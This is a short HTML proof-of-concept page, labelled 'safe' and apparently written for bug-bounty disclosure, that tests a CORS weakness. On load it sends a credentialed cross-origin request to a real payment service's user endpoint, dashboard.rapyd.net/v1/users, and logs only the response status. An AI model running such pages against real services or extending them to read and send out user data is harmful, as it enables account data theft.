<!DOCTYPE html>
<html>
<body>
<h3>Rapyd CORS PoC (Safe)</h3>
<script>
fetch('https://dashboard.rapyd.net/v1/users', {
  method: 'GET',
  credentials: 'include'
})
.then(res => console.log('Response status:', res.status))
.catch(err => console.log('Fetch error (expected with no session):', err));
</script>
</body>
</html>
